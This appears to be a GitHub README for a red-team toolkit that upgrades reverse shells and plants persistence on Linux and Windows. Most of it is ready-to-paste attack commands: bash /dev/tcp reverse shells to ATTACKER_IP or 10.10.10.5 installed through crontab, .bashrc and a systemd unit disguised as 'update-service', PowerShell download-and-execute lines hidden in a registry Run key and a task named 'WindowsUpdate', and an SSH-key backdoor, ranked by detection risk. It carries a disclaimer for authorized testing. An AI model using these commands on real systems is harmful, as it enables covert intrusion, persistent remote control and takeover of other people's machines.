# 🛡️ Shell Stabilizer - Professional Shell Upgrade & Persistence Toolkit

A comprehensive toolkit for stabilizing reverse shells, upgrading to fully interactive TTY sessions, and maintaining persistent access across Linux and Windows systems.

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg)](https://github.com/yourusername/shell-stabilizer)

## 📋 Table of Contents

- [Features](#-features)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Usage Guide](#-usage-guide)
- [Stabilization Techniques](#-stabilization-techniques)
- [Persistence Methods](#-persistence-methods)
- [Project Structure](#-project-structure)
- [Examples](#-examples)
- [Troubleshooting](#-troubleshooting)
- [Legal Disclaimer](#%EF%B8%8F-legal-disclaimer)
- [Contributing](#-contributing)
- [Resources](#-resources)

---

## ✨ Features

### Shell Stabilization
- **Multiple Upgrade Techniques** - Python PTY, script, expect, socat, and more
- **Full TTY Support** - Job control, tab completion, arrow keys, Ctrl+C/Z handling
- **Cross-Platform** - Comprehensive support for Linux and Windows shells
- **Automated Guide Generation** - Create custom stabilization guides for your environment

### Persistence Methods
- **Linux Persistence**
  - Cron jobs
  - Bash startup files
  - SSH authorized keys
  - Systemd services
- **Windows Persistence**
  - Registry Run keys
  - Scheduled tasks
  - Startup folder
  - WMI event subscriptions

### Testing & Validation
- **Feature Testing** - Verify shell capabilities and interactivity
- **Troubleshooting Guides** - Common issues and solutions for both platforms
- **Risk Assessment** - Detection risk levels for each persistence method

---

## 🚀 Installation

### Prerequisites

```bash
# Python 3.7 or higher
python3 --version

# Optional dependencies for specific features
pip3 install -r requirements.txt  # If available
```

### Clone Repository

```bash
git clone https://github.com/yourusername/shell-stabilizer.git
cd shell-stabilizer
```

### Project Structure

```
shell_stabilizer/
├── config.py                  # Configuration and constants
├── main.py                    # Entry point
├── stabilizer.py              # Main orchestration
├── techniques/                # Stabilization techniques
│   ├── __init__.py
│   ├── linux_techniques.py
│   └── windows_techniques.py
├── persistence/               # Persistence methods
│   ├── __init__.py
│   ├── linux_persistence.py
│   └── windows_persistence.py
├── testing/                   # Testing utilities
│   ├── __init__.py
│   └── feature_tests.py
└── reporting/                 # Guide generation
    ├── __init__.py
    ├── guide_generator.py
    └── troubleshooting.py
```

---

## 🎯 Quick Start

### Generate Stabilization Guide

```bash
# Linux shell stabilization guide
python3 main.py --type linux --generate-guide

# Windows shell stabilization guide
python3 main.py --type windows --generate-guide

# Custom output file
python3 main.py --generate-guide --output my_custom_guide.txt
```

### View Persistence Methods

```bash
# Linux persistence options
python3 main.py --type linux --persistence

# Windows persistence options
python3 main.py --type windows --persistence
```

### Test Shell Features

```bash
# Show shell feature test checklist
python3 main.py --test
```

---

## 📖 Usage Guide

### Command Line Options

```bash
python3 main.py [OPTIONS]

Options:
  --type {linux,windows}    Shell type (default: linux)
  --generate-guide          Generate full stabilization guide
  --persistence             Show persistence methods
  --test                    Show shell feature tests
  --output FILE             Output filename for guide (default: shell_stabilization.txt)
  -h, --help               Show help message
```

### Common Workflows

#### 1. **Post-Exploitation: Stabilize Your Shell**

```bash
# Step 1: Generate guide for your target OS
python3 main.py --type linux --generate-guide

# Step 2: Review the generated guide
cat shell_stabilization.txt

# Step 3: Apply techniques from the guide on your reverse shell
# (Copy commands from guide to your active shell)
```

#### 2. **Establish Persistence**

```bash
# Step 1: View persistence options with risk levels
python3 main.py --type linux --persistence

# Step 2: Choose appropriate method based on:
# - Detection risk (Low/Medium/High)
# - Required privileges (User/Root)
# - Target environment constraints

# Step 3: Apply chosen persistence method
# (Copy commands from output to your shell)
```

#### 3. **Verify Shell Capabilities**

```bash
# Step 1: Get feature test checklist
python3 main.py --test

# Step 2: Test each feature in your shell
# ✓ Basic commands (whoami, pwd, id)
# ✓ Terminal control (Ctrl+C, Ctrl+Z, tab completion)
# ✓ Interactive programs (vi, less, top)
```

---

## 🔧 Stabilization Techniques

### Linux Techniques

#### 1. **Python PTY Spawn** (⭐ Recommended)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Pros:**
- ✅ Most reliable and widely available
- ✅ Works on 99% of Linux systems
- ✅ Provides basic job control

**Cons:**
- ❌ Requires Python on target
- ❌ Not fully interactive without additional steps

**Use When:** Python is installed (most Linux systems)

---

#### 2. **Full Interactive TTY** (⭐⭐⭐ Best Experience)

```bash
# Step 1: In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Step 2: Background the shell (Ctrl+Z)

# Step 3: On attacker machine
stty raw -echo; fg

# Step 4: Press Enter twice

# Step 5: Back in reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116  # Adjust to your terminal
```

**Pros:**
- ✅ Full TTY with job control
- ✅ Tab completion works
- ✅ Arrow keys for history
- ✅ Ctrl+C/Z work properly
- ✅ Interactive programs (vi, less, top) work

**Cons:**
- ❌ Multi-step process
- ❌ Requires terminal size adjustment

**Use When:** You need full shell functionality for extended operations

---

#### 3. **Script Command PTY**

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

**Pros:**
- ✅ No Python required
- ✅ Available on most systems
- ✅ Simple single command

**Cons:**
- ❌ Less reliable than Python
- ❌ May not work on all distributions

**Use When:** Python is not available

---

#### 4. **Socat PTY** (⭐⭐ Most Feature-Rich)

```bash
# On target (if socat is installed)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

**Pros:**
- ✅ Most fully-featured option
- ✅ Proper signal handling
- ✅ Excellent stability

**Cons:**
- ❌ Rarely installed by default
- ❌ Requires socat binary

**Use When:** Socat is available and you need maximum stability

---

### Windows Techniques

#### 1. **PowerShell Upgrade**

```powershell
powershell.exe -NoP -NonI -Exec Bypass
```

**Pros:**
- ✅ Better than cmd.exe
- ✅ More commands available
- ✅ Better scripting capabilities

**Cons:**
- ❌ Still limited interactivity
- ❌ No readline functionality

**Use When:** You have cmd.exe and want better features

---

#### 2. **ConPTY Full Interactive** (⭐⭐⭐ Best for Windows)

```powershell
# Download and execute ConPtyShell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell ATTACKER_IP 4444
```

**Pros:**
- ✅ Full interactive shell
- ✅ Proper terminal emulation
- ✅ All Windows tools work properly

**Cons:**
- ❌ Requires internet to download
- ❌ May trigger AV/EDR

**Use When:** You need full Windows shell functionality

---

#### 3. **Rlwrap (Attacker Side)**

```bash
# On attacker machine BEFORE receiving shell
rlwrap nc -lvnp 4444
```

**Pros:**
- ✅ Simple to use
- ✅ Provides command history
- ✅ Arrow keys work
- ✅ No target-side changes needed

**Cons:**
- ❌ Must be set up before connection
- ❌ Not true TTY

**Use When:** You're setting up listener and want better UX

---

## 🔐 Persistence Methods

### Linux Persistence

#### 1. **Cron Job** (⚠️ Medium Risk)

```bash
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
```

**Detection Risk:** Medium  
**Requires:** User account access  
**Persistence:** Runs every 10 minutes  

**Pros:**
- ✅ Automatic reconnection
- ✅ Survives reboots
- ✅ User-level access sufficient

**Cons:**
- ❌ Visible in `crontab -l`
- ❌ Creates network traffic regularly
- ❌ Logs to syslog

---

#### 2. **Bash Startup Files** (✅ Low Risk)

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bash_profile
```

**Detection Risk:** Low  
**Requires:** Write access to home directory  
**Persistence:** Triggers on user login  

**Pros:**
- ✅ Rarely checked
- ✅ Easy to implement
- ✅ Natural trigger (login)

**Cons:**
- ❌ Only works when user logs in
- ❌ Visible in plaintext

---

#### 3. **SSH Authorized Keys** (✅ Low Risk, Stealthy)

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Detection Risk:** Low  
**Requires:** SSH service enabled  
**Persistence:** Permanent until key removed  

**Pros:**
- ✅ Very stealthy
- ✅ Legitimate access method
- ✅ Encrypted connection
- ✅ No shell callbacks

**Cons:**
- ❌ Requires SSH service
- ❌ SSH logs will show connections

**Best Practice:** Use this for long-term, low-noise access

---

#### 4. **Systemd Service** (🔴 High Risk)

```bash
cat > /etc/systemd/system/update-service.service << EOF
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update-service
systemctl start update-service
```

**Detection Risk:** High  
**Requires:** Root access  
**Persistence:** Automatic restart, survives reboots  

**Pros:**
- ✅ Automatic restart on failure
- ✅ Starts at boot
- ✅ System-level persistence

**Cons:**
- ❌ Highly visible in systemctl
- ❌ Requires root
- ❌ Obvious in service lists

---

### Windows Persistence

#### 1. **Registry Run Key** (⚠️ Medium Risk)

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command IEX(IWR http://ATTACKER_IP/payload.ps1 -UseBasicParsing)" /f
```

**Detection Risk:** Medium  
**Requires:** User account access  
**Persistence:** Runs at user login  

**Pros:**
- ✅ Common persistence method
- ✅ Survives reboots
- ✅ User-level access sufficient

**Cons:**
- ❌ Heavily monitored by AV/EDR
- ❌ Visible in Registry
- ❌ Autoruns.exe will detect it

---

#### 2. **Scheduled Task** (⚠️ Medium Risk)

```cmd
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -WindowStyle Hidden -Command IEX(...)" /sc onlogon /ru System
```

**Detection Risk:** Medium  
**Requires:** User or SYSTEM access  
**Persistence:** Triggers on logon  

**Pros:**
- ✅ Flexible scheduling
- ✅ Can run as SYSTEM
- ✅ Survives reboots

**Cons:**
- ❌ Visible in Task Scheduler
- ❌ Logged in Event Viewer
- ❌ Easily detected

---

#### 3. **Startup Folder** (✅ Low Risk)

```cmd
copy payload.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

**Detection Risk:** Low  
**Requires:** Write access to user profile  
**Persistence:** Runs at user login  

**Pros:**
- ✅ Simple and reliable
- ✅ Works for specific user
- ✅ Less monitored than Registry

**Cons:**
- ❌ Only for current user
- ❌ Visible in Startup folder

---

#### 4. **WMI Event Subscription** (🔴 High Risk, Advanced)

```powershell
$FilterArgs = @{
    name='Updater'
    EventNameSpace="root\CimV2"
    QueryLanguage="WQL"
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
```

**Detection Risk:** High  
**Requires:** Admin access  
**Persistence:** Event-based trigger  

**Pros:**
- ✅ Very stealthy if done right
- ✅ Event-based activation
- ✅ Hard to detect without specific tools

**Cons:**
- ❌ Complex to implement
- ❌ Requires admin privileges
- ❌ WMI is increasingly monitored

---

## 📁 Project Structure

```
shell_stabilizer/
│
├── config.py                      # Global configuration
│   ├── Shell types and defaults
│   ├── Detection commands
│   └── Output settings
│
├── main.py                        # CLI entry point
│   ├── Argument parsing
│   └── Command routing
│
├── stabilizer.py                  # Main orchestration
│   ├── ShellStabilizer class
│   ├── ShellPersistence class
│   └── Technique/persistence routing
│
├── techniques/                    # Stabilization techniques
│   ├── __init__.py
│   ├── linux_techniques.py        # Linux PTY, TTY, script, socat
│   └── windows_techniques.py      # PowerShell, ConPTY, rlwrap
│
├── persistence/                   # Persistence methods
│   ├── __init__.py
│   ├── linux_persistence.py       # Cron, bashrc, SSH, systemd
│   └── windows_persistence.py     # Registry, tasks, WMI
│
├── testing/                       # Testing utilities
│   ├── __init__.py
│   └── feature_tests.py           # Shell capability tests
│
└── reporting/                     # Documentation generation
    ├── __init__.py
    ├── guide_generator.py         # Guide formatting and output
    └── troubleshooting.py         # Common issues and fixes
```

---

## 💡 Examples

### Example 1: Basic Linux Shell Stabilization

```bash
# Scenario: You have a basic netcat reverse shell on Linux

# Step 1: Generate guide
python3 main.py --type linux --generate-guide

# Step 2: In your reverse shell, execute:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 3: Test features
whoami              # ✓ Works
pwd                # ✓ Works
Ctrl+C             # ✗ Kills shell (need full TTY)
```

### Example 2: Full Linux TTY Upgrade

```bash
# Step 1: Basic PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Step 2: Background (Ctrl+Z)

# Step 3: On attacker machine
stty raw -echo; fg

# Press Enter twice

# Step 4: In shell
reset
export SHELL=bash
export TERM=xterm-256color

# Get your terminal size
stty -a  # On attacker machine

# Set in reverse shell
stty rows 38 columns 116

# Now you have full TTY!
vi test.txt         # ✓ Works!
less /etc/passwd    # ✓ Works!
Ctrl+C              # ✓ Doesn't kill shell!
```

### Example 3: Windows PowerShell Upgrade

```powershell
# In your cmd.exe shell:
powershell.exe -NoP -NonI -Exec Bypass

# Now you have PowerShell!
Get-Process
Get-Content C:\important\file.txt
```

### Example 4: Establishing SSH Key Persistence

```bash
# Generate key pair on attacker machine
ssh-keygen -t rsa -b 4096 -f ~/.ssh/target_key

# View public key
cat ~/.ssh/target_key.pub

# In reverse shell on target:
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDe..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# From attacker machine:
ssh -i ~/.ssh/target_key user@target_ip

# ✓ Persistent, encrypted, legitimate-looking access!
```

### Example 5: Low-Risk Cron Persistence

```bash
# View current crontab
crontab -l

# Add persistence (reconnects every 10 minutes)
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'") | crontab -

# Verify
crontab -l

# Set up listener to catch callbacks
nc -lvnp 4444

# Wait up to 10 minutes for callback
```

---

## 🔍 Troubleshooting

### Linux Issues

#### Issue: Shell dies when I press Ctrl+C

**Cause:** Shell is not in raw mode  
**Solution:** Use full TTY upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

---

#### Issue: No tab completion

**Cause:** TERM variable not set properly  
**Solution:**

```bash
export TERM=xterm
# Or for full upgrade:
export TERM=xterm-256color
```

---

#### Issue: Backspace doesn't work properly

**Cause:** Terminal not in raw mode  
**Solution:** Use `stty raw -echo` on attacker machine before foregrounding

---

#### Issue: Can't use vi/less/top

**Cause:** Not a true TTY  
**Solution:** Full TTY upgrade required (see Example 2)

---

#### Issue: Shell hangs/freezes

**Cause:** TERM mismatch or terminal size issues  
**Solutions:**

```bash
# Reset terminal
reset

# Set proper TERM
export TERM=xterm

# Adjust terminal size
stty rows 38 columns 116  # Use your actual terminal size
```

---

### Windows Issues

#### Issue: Limited command output in cmd.exe

**Solution:** Upgrade to PowerShell

```cmd
powershell.exe -NoP -NonI -Exec Bypass
```

---

#### Issue: No command history (arrow keys don't work)

**Solution:** Use rlwrap on attacker side

```bash
# On attacker machine BEFORE catching shell:
rlwrap nc -lvnp 4444
```

---

#### Issue: Encoding issues (weird characters)

**Solution:**

```powershell
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
```

---

#### Issue: Execution policy blocks scripts

**Solution:**

```powershell
powershell -ExecutionPolicy Bypass
# Or
Set-ExecutionPolicy Bypass -Scope Process
```

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

This tool is designed for:
- ✅ Authorized penetration testing
- ✅ Red team exercises with written permission
- ✅ Security research in controlled environments
- ✅ Educational purposes on systems you own

**ILLEGAL USE IS PROHIBITED**

- ❌ Unauthorized access to computer systems
- ❌ Unauthorized persistence on systems you don't own
- ❌ Any malicious or illegal activity

**By using this tool, you agree that:**
1. You have explicit written authorization to test target systems
2. You will comply with all applicable local, state, and federal laws
3. You accept full responsibility for your actions
4. The authors are not liable for misuse of this tool

**Violation of these terms may result in:**
- Civil and criminal penalties
- Prosecution under computer fraud laws (CFAA, CMA, etc.)
- Imprisonment and fines

**Remember:** "For educational purposes" is NOT a legal defense. Always get written authorization.

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

### How to Contribute

1. **Fork the repository**
2. **Create a feature branch**
   ```bash
   git checkout -b feature/new-technique
   ```
3. **Make your changes**
4. **Test thoroughly**
5. **Submit a pull request**

### Contribution Ideas

- 🆕 New stabilization techniques
- 🐛 Bug fixes
- 📚 Documentation improvements
- 🧪 Additional test cases
- 🎨 Code quality improvements

### Code Style

- Follow PEP 8 guidelines
- Add docstrings to all functions
- Include comments for complex logic
- Update README.md for new features

### Adding New Techniques

**Example: Adding a new Linux technique**

1. Edit `techniques/linux_techniques.py`:

```python
def get_linux_techniques():
    techniques = {
        # ... existing techniques ...
        'new_technique': {
            'name': 'Your New Technique Name',
            'commands': [
                'command1',
                'command2'
            ],
            'notes': 'Description of when/why to use this technique'
        }
    }
    return techniques
```

2. Test your addition:

```bash
python3 main.py --type linux --generate-guide
```

3. Submit PR with:
   - Clear description of the technique
   - Use cases
   - Testing results

---

## 📚 Resources

### Learning Resources

**General Shell Upgrading:**
- [ropnop's Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [HackTricks - Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)

**Linux Persistence:**
- [MITRE ATT&CK - Persistence (Linux)](https://attack.mitre.org/tactics/TA0003/)
- [Linux Persistence Mechanisms](https://github.com/Karneades/malware-persistence)

**Windows Persistence:**
- [MITRE ATT&CK - Persistence (Windows)](https://attack.mitre.org/tactics/TA0003/)
- [Windows Persistence Techniques](https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=Persistence)

### Tools & Frameworks

- [pwncat](https://github.com/calebstewart/pwncat) - Automated shell upgrade and persistence
- [Metasploit](https://www.metasploit.com/) - Full-featured exploitation framework
- [Empire](https://github.com/BC-SECURITY/Empire) - PowerShell post-exploitation
- [Covenant](https://github.com/cobbr/Covenant) - .NET command and control

### Related Projects

- [Reverse Shell Generator](https://www.revshells.com/)
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation
- [LOLBAS](https://lolbas-project.github.io/) - Windows Living Off the Land binaries

---

## 📝 Changelog

### v1.0.0 (2024-01-15)
- ✨ Initial release
- 🎯 Linux stabilization techniques
- 🎯 Windows stabilization techniques
- 🔐 Linux persistence methods
- 🔐 Windows persistence methods
- 📖 Comprehensive guide generation
- 🧪 Shell feature testing

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2024 [Your Name]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 👤 Author

**Your Name**
- GitHub: [@yourusername](https://github.com/yourusername)
- Twitter: [@yourusername](https://twitter.com/yourusername)
- Blog: [yourblog.com](https://yourblog.com)

---

## 🌟 Acknowledgments

- The InfoSec community for sharing knowledge
- [ropnop](https://blog.ropnop.com/) for shell upgrade techniques
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) for comprehensive cheatsheets
- [MITRE ATT&CK](https://attack.mitre.org/) for persistence technique documentation

---

## 💬 Support

If you have questions or need help:

1. 📖 Check the [Troubleshooting](#-troubleshooting) section
2. 🔍 Search [existing issues](https://github.com/yourusername/shell-stabilizer/issues)
3. 🆕 Open a [new issue](https://github.com/yourusername/shell-stabilizer/issues/new)
4. 💬 Join our [Discord community](https://discord.gg/yourserver)

---

<div align="center">

**⭐ Star this repo if you find it useful! ⭐**

Made with ❤️ for the Red Team community

</div>